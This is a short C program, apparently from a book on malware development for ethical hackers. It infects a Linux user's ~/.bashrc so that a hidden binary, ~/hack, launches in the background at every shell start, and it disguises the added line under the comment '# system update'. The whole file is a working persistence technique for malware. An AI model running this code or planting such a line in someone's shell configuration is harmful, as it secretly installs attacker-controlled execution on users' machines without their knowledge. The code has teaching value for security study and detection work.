/*
 * Malware Development for Ethical Hackers 2nd
 * pers.c
 * simple .bashrc infector for 
 * local persistence
 * author: @cocomelonc
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main() {
  char *home = getenv("HOME");
  char path[512];
  sprintf(path, "%s/.bashrc", home);

  // our payload command (e.g., hidden binary in the same dir)
  const char *trigger = "\n# system update\n(~/hack &)\n";

  FILE *f = fopen(path, "a+");
  if (f) {
    fputs(trigger, f);
    fclose(f);
    printf("persistence installed in %s\n", path);
  }
  return 0;
}